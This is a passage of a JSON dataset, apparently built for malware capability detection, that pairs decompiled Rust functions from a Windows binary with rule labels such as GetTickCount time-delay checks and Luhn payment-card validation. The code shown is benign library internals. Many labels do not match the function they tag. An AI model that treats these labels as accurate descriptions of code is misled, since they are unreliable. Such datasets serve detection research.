        "decompiled_code": "\nvoid sym._ZN3std2io5impls74__LT_impl_u20_std..io..Write_u20_for_u20_alloc..vec..Vec_LT_u8_C_A_GT__GT_14write_vectored17hb77812388c92b84\n               (ulong *arg1, int64_t *arg2, uint32_t *arg3, int64_t arg4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    uint32_t *puVar3;\n    uint64_t arg3_00;\n    uint64_t arg3_01;\n    \n    if (arg4 * 0x10 == 0) {\n        arg3_01 = 0;\n    }\n    else {\n        iVar2 = 0;\n        arg3_01 = 0;\n        do {\n            arg3_01 = arg3_01 + *(arg3 + iVar2);\n            iVar2 = iVar2 + 0x10;\n        } while (arg4 * 0x10 != iVar2);\n        if (arg2[1] - arg2[2] < arg3_01) {\n            dbg.do_reserve_and_handle<u8, alloc::alloc::Global>(arg2, arg2[2], arg3_01);\n        }\n    }\n    if (arg4 != 0) {\n        puVar3 = arg3 + arg4 * 4;\n        iVar2 = arg2[2];\n        do {\n            arg3_00 = *arg3;\n            uVar1 = *(arg3 + 2);\n            if (arg2[1] - iVar2 < arg3_00) {\n                dbg.do_reserve_and_handle<u8, alloc::alloc::Global>(arg2, iVar2, arg3_00);\n                iVar2 = arg2[2];\n            }\n            sym.memcpy(*arg2 + iVar2, uVar1, arg3_00);\n            iVar2 = iVar2 + arg3_00;\n            arg2[2] = iVar2;\n            arg3 = arg3 + 4;\n        } while (puVar3 != arg3);\n    }\n    arg1[1] = arg3_01;\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 473
    },
    "ba042f4a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong sym.std::io::impls::__impl_std::io::Write_for_alloc::vec::Vec_u8_A__::write_all::hba042f4a54eddf3a\n                (int64_t *arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t arg2_00;\n    \n    // std::io::impls::_<impl std::io::Write for alloc::vec::Vec<u8,A>>::write_all::hba042f4a54eddf3a\n    arg2_00 = arg1[2];\n    if (arg1[1] - arg2_00 < arg3) {\n        dbg.do_reserve_and_handle<u8, alloc::alloc::Global>(arg1, arg2_00, arg3);\n        arg2_00 = arg1[2];\n    }\n    sym.memcpy(*arg1 + arg2_00, arg2, arg3);\n    arg1[2] = arg2_00 + arg3;\n    return 0;\n}\n",
        "token_count": 221
    },
    "e0835cd9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid sym.alloc::vec::Vec_T_A_::push::he0835cd99a235e59(int64_t *arg1, ulong arg2)\n\n{\n    int64_t arg2_00;\n    \n    // alloc::vec::Vec<T,A>::push::he0835cd99a235e59\n    arg2_00 = arg1[2];\n    if (arg2_00 == arg1[1]) {\n        sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hc9c20ce1ceee53c1(arg1, arg2_00);\n        arg2_00 = arg1[2];\n    }\n    *(*arg1 + arg2_00) = arg2;\n    arg1[2] = arg2_00 + 1;\n    return;\n}\n",
        "token_count": 174
    },
    "f5219433": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid sym.alloc::vec::Vec_T_A_::push::hf521943342c1dfe4(int64_t *arg1, uint *arg2)\n\n{\n    uint *puVar1;\n    int64_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t arg2_00;\n    \n    // alloc::vec::Vec<T,A>::push::hf521943342c1dfe4\n    arg2_00 = arg1[2];\n    if (arg2_00 == arg1[1]) {\n        sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h0b67e62becfb7454(arg1, arg2_00);\n        arg2_00 = arg1[2];\n    }\n    iVar2 = *arg1;\n    *(iVar2 + 0x10 + arg2_00 * 0x18) = *(arg2 + 4);\n    uVar3 = arg2[1];\n    uVar4 = arg2[2];\n    uVar5 = arg2[3];\n    puVar1 = iVar2 + arg2_00 * 0x18;\n    *puVar1 = *arg2;\n    puVar1[1] = uVar3;\n    puVar1[2] = uVar4;\n    puVar1[3] = uVar5;\n    arg1[2] = arg2_00 + 1;\n    return;\n}\n",
        "token_count": 322
    },
    "3822946f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid sym.alloc::vec::Vec_T_A_::push::h3822946f157e7ae8(int64_t *arg1, ulong arg2)\n\n{\n    int64_t arg2_00;\n    \n    // alloc::vec::Vec<T,A>::push::h3822946f157e7ae8\n    arg2_00 = arg1[2];\n    if (arg2_00 == arg1[1]) {\n        sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hbc7cd8dccb0eacb6(arg1, arg2_00);\n        arg2_00 = arg1[2];\n    }\n    *(*arg1 + arg2_00 * 2) = arg2;\n    arg1[2] = arg2_00 + 1;\n    return;\n}\n",
        "token_count": 179
    },
    "8176f034": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid sym._core::hash::sip::Hasher_S__as_core::hash::Hasher_::write::h8176f034ddda3e7a\n               (int64_t arg1, int64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    ulong uVar4;\n    uint64_t arg2_00;\n    \n    // <core::hash::sip::Hasher<S> as core::hash::Hasher>::write::h8176f034ddda3e7a\n    *(arg1 + 0x10) = *(arg1 + 0x10) + arg3;\n    iVar1 = *(arg1 + 0x40);\n    if (iVar1 == 0) {\n        arg2_00 = 0;\n    }\n    else {\n        arg2_00 = 8 - iVar1;\n        uVar3 = arg3;\n        if (arg2_00 < arg3) {\n            uVar3 = arg2_00;\n        }\n        iVar2 = sym._ZN4core4hash3sip9u8to64_le17h908bae7fbeb16cffE.364(arg2, 0, uVar3);\n        uVar3 = iVar2 << (iVar1 * '\\b' & 0x3fU) | *(arg1 + 0x38);\n        *(arg1 + 0x38) = uVar3;\n        if (arg3 < arg2_00) {\n            arg3 = iVar1 + arg3;\n            goto code_r0x0043e1a6;\n        }\n        *(arg1 + 0x30) = *(arg1 + 0x30) ^ uVar3;\n        sym._ZN69__LT_core..hash..sip..Sip13Rounds_u20_as_u20_core..hash..sip..Sip_GT_8c_rounds17hd77c6983cbb50731E.363\n                  (arg1 + 0x18);\n        *(arg1 + 0x18) = *(arg1 + 0x18) ^ *(arg1 + 0x38);\n        *(arg1 + 0x40) = 0;\n    }\n    arg3 = arg3 - arg2_00;\n    for (; arg2_00 < (arg3 & 0xfffffffffffffff8); arg2_00 = arg2_00 + 8) {\n        uVar3 = *(arg2 + arg2_00);\n        *(arg1 + 0x30) = *(arg1 + 0x30) ^ uVar3;\n        sym._ZN69__LT_core..hash..sip..Sip13Rounds_u20_as_u20_core..hash..sip..Sip_GT_8c_rounds17hd77c6983cbb50731E.363\n                  (arg1 + 0x18);\n        *(arg1 + 0x18) = *(arg1 + 0x18) ^ uVar3;\n    }\n    arg3 = arg3 & 7;\n    uVar4 = sym._ZN4core4hash3sip9u8to64_le17h908bae7fbeb16cffE.364(arg2, arg2_00, arg3);\n    *(arg1 + 0x38) = uVar4;\ncode_r0x0043e1a6:\n    *(arg1 + 0x40) = arg3;\n    return;\n}\n",
        "token_count": 764
    },
    "edf423d5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong sym.core::slice::index::__impl_core::ops::index::Index_I__for__T__::index::hedf423d5d4f1c40e\n                (ulong arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    // core::slice::index::_<impl core::ops::index::Index<I> for [T]>::index::hedf423d5d4f1c40e\n    if (arg3 <= arg2) {\n        return arg1;\n    }\n    dbg.slice_end_index_len_fail(arg3, arg2);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 142
    },
    "bce6dfd9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t sym.rayon::iter::plumbing::LengthSplitter::new::hbce6dfd9f33a120c(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    \n    // rayon::iter::plumbing::LengthSplitter::new::hbce6dfd9f33a120c\n    uVar1 = sym.rayon_core::current_num_threads::h8673cef0ca165181();\n    if (uVar1 < (arg1 == -1)) {\n        uVar1 = arg1 == -1;\n    }\n    return uVar1;\n}\n",
        "token_count": 132
    },
    "7e6b571d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid sym.alloc::vec::Vec_T_A_::reserve::h7e6b571d9f98cf37(int64_t arg1, uint64_t arg2)\n\n{\n    ulong arg1_00;\n    int64_t arg2_00;\n    \n    // alloc::vec::Vec<T,A>::reserve::h7e6b571d9f98cf37\n    arg2_00 = *(arg1 + 0x10);\n    if (arg2 <= *(arg1 + 8) - arg2_00) {\n        return;\n    }\n    arg1_00 = sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::hb8b4e66ae7491bb0(arg1, arg2_00, arg2);\n    if (arg2_00 == -0x7fffffffffffffff) {\n        return;\n    }\n    if (arg2_00 == 0) {\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    dbg.handle_alloc_error(arg1_00);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 260
    },
    "3c429368": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t sym._alloc::string::String_as_core::cmp::PartialEq_::eq::h3c4293686a2aa2b2(ulong *s1, ulong *s2)\n\n{\n    uint64_t uVar1;\n    \n    // <alloc::string::String as core::cmp::PartialEq>::eq::h3c4293686a2aa2b2\n    if (s1[2] == s2[2]) {\n        uVar1 = sub.msvcrt.dll_memcmp(*s1, *s2);\n        uVar1 = uVar1 & 0xffffffffffffff00 | uVar1 == 0;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 165
    },
    "0558e25a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.std::sys_common::backtrace::__rust_begin_short_backtrace::h0558e25aa952e38c(code *param_1)\n\n{\n    // std::sys_common::backtrace::__rust_begin_short_backtrace::h0558e25aa952e38c\n    (*param_1)();\n    return;\n}\n",
        "token_count": 71
    },
    "b6b8b777": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.hashbrown::raw::RawTableInner_A_::free_buckets::hb6b8b7770b04fba1(int64_t *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    \n    // hashbrown::raw::RawTableInner<A>::free_buckets::hb6b8b7770b04fba1\n    uVar1 = arg2 * (*arg1 + 1) + 0xfU & 0xfffffffffffffff0;\n    if (*arg1 + uVar1 == -0x11) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, arg1[1] - uVar1);\n    return;\n}\n",
        "token_count": 214
    },
    "716180fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong sym._mut_W_as_core::fmt::Write_::write_char::h716180fcdeed38e9(ulong *arg1, ulong arg2)\n\n{\n    // <&mut W as core::fmt::Write>::write_char::h716180fcdeed38e9\n    dbg.push(*arg1, arg2);\n    return 0;\n}\n",
        "token_count": 79
    },
    "f0cd28af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._mut_W_as_core::fmt::Write_::write_fmt::hf0cd28aff696bea1(ulong *arg1, uint *arg2)\n\n{\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    // <&mut W as core::fmt::Write>::write_fmt::hf0cd28aff696bea1\n    uStack64 = *arg1;\n    uStack56 = *arg2;\n    uStack52 = arg2[1];\n    uStack48 = arg2[2];\n    uStack44 = arg2[3];\n    uStack40 = arg2[4];\n    uStack36 = arg2[5];\n    uStack32 = arg2[6];\n    uStack28 = arg2[7];\n    uStack24 = arg2[8];\n    uStack20 = arg2[9];\n    uStack16 = arg2[10];\n    uStack12 = arg2[0xb];\n    dbg.write(&uStack64, 0x444790, &uStack56);\n    return;\n}\n",
        "token_count": 295
    },
    "4ce79b37": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._alloc::string::FromUtf16Error_as_core::fmt::Debug_::fmt::h4ce79b370197fe6b(ulong arg1, ulong arg2)\n\n{\n    ulong uStack8;\n    \n    // <alloc::string::FromUtf16Error as core::fmt::Debug>::fmt::h4ce79b370197fe6b\n    uStack8 = arg1;\n    sym.core::fmt::Formatter::debug_tuple_field1_finish::haca11a36ffb48117(arg2, \"FromUtf16Error\", 0xe, &uStack8);\n    return;\n}\n",
        "token_count": 132
    },
    "4e5384f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._core::fmt::Arguments_as_core::fmt::Display_::fmt::h4e5384f2a3114011(uint *arg1, int64_t arg2)\n\n{\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    // <core::fmt::Arguments as core::fmt::Display>::fmt::h4e5384f2a3114011\n    uStack56 = *arg1;\n    uStack52 = arg1[1];\n    uStack48 = arg1[2];\n    uStack44 = arg1[3];\n    uStack40 = arg1[4];\n    uStack36 = arg1[5];\n    uStack32 = arg1[6];\n    uStack28 = arg1[7];\n    uStack24 = arg1[8];\n    uStack20 = arg1[9];\n    uStack16 = arg1[10];\n    uStack12 = arg1[0xb];\n    dbg.write(*(arg2 + 0x20), *(arg2 + 0x28), &uStack56);\n    return;\n}\n",
        "token_count": 294
    },
    "2aa693f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._core::char::EscapeDebug_as_core::iter::traits::iterator::Iterator_::next::h2aa693f26d45b8d3(uint32_t *arg1)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    ulong in_R8;\n    \n    // <core::char::EscapeDebug as core::iter::traits::iterator::Iterator>::next::h2aa693f26d45b8d3\n    UNRECOVERED_JUMPTABLE = *(*arg1 * 4 + 0x407d2c) + 0x407d2c;\n    // WARNING: Could not recover jumptable at 0x00407c98. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (10 cases) at 0x407d2c\n    (*UNRECOVERED_JUMPTABLE)(UNRECOVERED_JUMPTABLE, 0x407d2c, in_R8, arg1);\n    return;\n}\n",
        "token_count": 222
    },
    "4de8d2cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint64_t sym._core::panic::panic_info::PanicInfo_as_core::fmt::Display_::fmt::h4de8d2cce7eb5030\n                   (int64_t *arg1, int64_t arg2)\n\n{\n    ulong arg1_00;\n    int64_t arg2_00;\n    int64_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    ulong unaff_RBX;\n    uint64_t uVar5;\n    int64_t iStack144;\n    ulong uStack136;\n    ulong uStack128;\n    ulong uStack120;\n    int64_t **ppiStack104;\n    ulong uStack96;\n    int64_t *piStack88;\n    code *pcStack80;\n    int64_t *piStack72;\n    code *pcStack64;\n    int64_t iStack56;\n    code *pcStack48;\n    \n    // <core::panic::panic_info::PanicInfo as core::fmt::Display>::fmt::h4de8d2cce7eb5030\n    arg1_00 = *(arg2 + 0x20);\n    arg2_00 = *(arg2 + 0x28);\n    cVar2 = (**(arg2_00 + 0x18))(arg1_00, \"panicked at \", 0xc);\n    uVar5 = CONCAT71(unaff_RBX >> 8, 1);\n    if (cVar2 != '\\0') goto code_r0x00408398;\n    if (arg1[2] == 0) {\n        iVar1 = *arg1;\n        iVar4 = (**(arg1[1] + 0x18))(iVar1);\n        if (iVar4 == -0x4751c238dd460df5) {\n            pcStack80 = dbg.fmt<&str>;\n            iStack144 = iVar1;\n            goto code_r0x004082c9;\n        }\n    }\n    else {\n        pcStack80 = dbg.fmt<core::fmt::Arguments>;\n        iStack144 = arg1[2];\ncode_r0x004082c9:\n        piStack88 = &iStack144;\n        uStack136 = 0x444a10;\n        uStack128 = 2;\n        uStack120 = 0;\n        ppiStack104 = &piStack88;\n        uStack96 = 1;\n        cVar2 = dbg.write(arg1_00, arg2_00, &uStack136);\n        if (cVar2 != '\\0') goto code_r0x00408398;\n    }\n    piStack88 = arg1[3];\n    piStack72 = piStack88 + 2;\n    iStack56 = piStack88 + 0x14;\n    pcStack80 = sym._T_as_core::fmt::Display_::fmt::h661b0706051ca33a;\n    pcStack64 = sym.core::fmt::num::imp::__impl_core::fmt::Display_for_u32_::fmt::h49805a7e5d3b869c;\n    pcStack48 = sym.core::fmt::num::imp::__impl_core::fmt::Display_for_u32_::fmt::h49805a7e5d3b869c;\n    uStack136 = 0x4449b0;\n    uStack128 = 3;\n    uStack120 = 0;\n    ppiStack104 = &piStack88;\n    uStack96 = 3;\n    uVar3 = dbg.write(arg1_00, arg2_00, &uStack136);\n    uVar5 = uVar3;\ncode_r0x00408398:\n    return uVar5 & 0xffffffff;\n}\n",
        "token_count": 808
    },
    "cb40b4ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::Write::write_fmt::hcb40b4ce420cba7a(ulong arg1, uint *arg2)\n\n{\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    // core::fmt::Write::write_fmt::hcb40b4ce420cba7a\n    uStack56 = *arg2;\n    uStack52 = arg2[1];\n    uStack48 = arg2[2];\n    uStack44 = arg2[3];\n    uStack40 = arg2[4];\n    uStack36 = arg2[5];\n    uStack32 = arg2[6];\n    uStack28 = arg2[7];\n    uStack24 = arg2[8];\n    uStack20 = arg2[9];\n    uStack16 = arg2[10];\n    uStack12 = arg2[0xb];\n    uStack64 = arg1;\n    dbg.write(&uStack64, 0x444cc0, &uStack56);\n    return;\n}\n",
        "token_count": 286
    },
    "48938559": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::Formatter::write_fmt::h489385595d20438a(ulong arg1, ulong arg2, uint *arg3)\n\n{\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    // core::fmt::Formatter::write_fmt::h489385595d20438a\n    uStack56 = *arg3;\n    uStack52 = arg3[1];\n    uStack48 = arg3[2];\n    uStack44 = arg3[3];\n    uStack40 = arg3[4];\n    uStack36 = arg3[5];\n    uStack32 = arg3[6];\n    uStack28 = arg3[7];\n    uStack24 = arg3[8];\n    uStack20 = arg3[9];\n    uStack16 = arg3[10];\n    uStack12 = arg3[0xb];\n    dbg.write(arg1, arg2, &uStack56);\n    return;\n}\n",
        "token_count": 266
    },
    "a3fd7167": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.alloc::sync::Arc_T_::drop_slow::ha3fd7167179996f8(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    \n    // alloc::sync::Arc<T>::drop_slow::ha3fd7167179996f8\n    iVar1 = *arg1;\n    piVar2 = *(iVar1 + 0x20);\n    LOCK();\n    *piVar2 = *piVar2 + -1;\n    if (*piVar2 == 0) {\n        sym.alloc::sync::Arc_T_::drop_slow::hb3d3773341c3a41a(iVar1 + 0x20);\n    }\n    if (iVar1 != -1) {\n        LOCK();\n        piVar2 = iVar1 + 8;\n        *piVar2 = *piVar2 + -1;\n        if (*piVar2 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, iVar1);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 290
    },
    "ac0f36c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.crossbeam_epoch::collector::Collector::new::hac0f36c0af9cc301(void)\n\n{\n    ulong uVar1;\n    ulong *puVar2;\n    uchar auStack2080 [2064];\n    ulong uStack16;\n    \n    // crossbeam_epoch::collector::Collector::new::hac0f36c0af9cc301\n    uStack16 = 0;\n    uVar1 = sym.crossbeam_epoch::atomic::Owned_T_::new::h0488c6e571c50320(auStack2080);\n    puVar2 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.116(0x280, 0x80);\n    *puVar2 = 1;\n    puVar2[1] = 1;\n    puVar2[0x10] = uVar1;\n    puVar2[0x20] = uVar1;\n    puVar2[0x30] = 0;\n    puVar2[0x40] = 0;\n    return;\n}\n",
        "token_count": 240
    },
    "0488c6e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong sym.crossbeam_epoch::atomic::Owned_T_::new::h0488c6e571c50320(ulong arg1)\n\n{\n    ulong uVar1;\n    \n    // crossbeam_epoch::atomic::Owned<T>::new::h0488c6e571c50320\n    uVar1 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.116(0x818, 8);\n    sym.memcpy(uVar1, arg1, 0x818);\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "9d5ddd9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.116(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sym.__rust_alloc(arg1, arg2);\n    if (iVar1 != 0) {\n        return;\n    }\n    dbg.handle_alloc_error(arg1);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 96
    },
    "eff87df9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get thread local storage value"
        ],
        "decompiled_code": "\nvoid sym._ZN3std10sys_common16thread_local_key9StaticKey3get17heff87df9eba4a787E.117(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sym._ZN3std10sys_common16thread_local_key9StaticKey3key17ha737541a6eb9c428E.120(0x443010);\n    // WARNING: Could not recover jumptable at 0x0044109c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsGetValue)(uVar1);\n    return;\n}\n",
        "token_count": 138
    },
    "b8e9483e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set thread local storage value"
        ],
        "decompiled_code": "\nvoid sym._ZN3std10sys_common16thread_local_key9StaticKey3set17hb8e9483efec9e5adE.118(ulong arg1, ulong arg2)\n\n{\n    uint uVar1;\n    \n    uVar1 = sym._ZN3std10sys_common16thread_local_key9StaticKey3key17ha737541a6eb9c428E.120(arg1);\n    // WARNING: Could not recover jumptable at 0x00441094. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(uVar1, arg2);\n    return;\n}\n",
        "token_count": 146
    },
    "b5d3f69d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t * sym.crossbeam_epoch::collector::Collector::register::hb5d3f69dce6e9b03(void)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    uint64_t uVar4;\n    uint64_t *puVar5;\n    bool bVar6;\n    uchar auStack2120 [16];\n    int64_t *piStack2104;\n    uchar auStack2096 [2056];\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    \n    // crossbeam_epoch::collector::Collector::register::hb5d3f69dce6e9b03\n    piVar3 = *0x443028;\n    LOCK();\n    iVar2 = **0x443028;\n    **0x443028 = **0x443028 + 1;\n    if (*piVar3 != 0 && SCARRY8(iVar2, 1) == *piVar3 < 0) {\n        sym._crossbeam_epoch::internal::Bag_as_core::default::Default_::default::hc63a9d19129ba85c(auStack2096);\n        auStack2120 = ZEXT816(0);\n        piStack2104 = piVar3;\n        uStack40 = 0;\n        uStack32 = 1;\n        uStack24 = 0;\n        uVar4 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.116(0x838, 8);\n        sym.memcpy(uVar4, auStack2120, 0x838);\n        puVar5 = uVar4 & 0xfffffffffffffff8;\n        uVar4 = piVar3[0x40];\n        do {\n            *puVar5 = uVar4;\n            LOCK();\n            puVar1 = piVar3 + 0x40;\n            bVar6 = uVar4 == *puVar1;\n            *puVar1 = *puVar1 ^ bVar6 * (*puVar1 ^ puVar5);\n            uVar4 = uVar4 ^ !bVar6 * (uVar4 ^ *puVar1);\n        } while (!bVar6);\n        return puVar5;\n    }\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 512
    },
    "7ae233d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.crossbeam_epoch::guard::Guard::defer_unchecked::h7ae233d637756e7f(int64_t *arg1, uint64_t arg2)\n\n{\n    code *pcStack32;\n    uint64_t uStack24;\n    \n    // crossbeam_epoch::guard::Guard::defer_unchecked::h7ae233d637756e7f\n    if (*arg1 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, arg2 & 0xfffffffffffffff8);\n        return;\n    }\n    pcStack32 = sym.crossbeam_epoch::deferred::Deferred::new::call::h04d2ad89245d19dd;\n    uStack24 = arg2;\n    sym.crossbeam_epoch::internal::Local::defer::h50a2d7bf5314df47(*arg1, &pcStack32);\n    return;\n}\n",
        "token_count": 250
    },
    "677e9cef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::mem::drop::h677e9cefe2f0f0a7(uint64_t arg1)\n\n{\n    // core::mem::drop::h677e9cefe2f0f0a7\n    sym._crossbeam_epoch::internal::Bag_as_core::ops::drop::Drop_::drop::h6824702aae2f0818\n              ((arg1 & 0xfffffffffffffff8) + 0x18);\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, arg1 & 0xfffffffffffffff8);\n    return;\n}\n",
        "token_count": 186
    },
    "c63a9d19": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
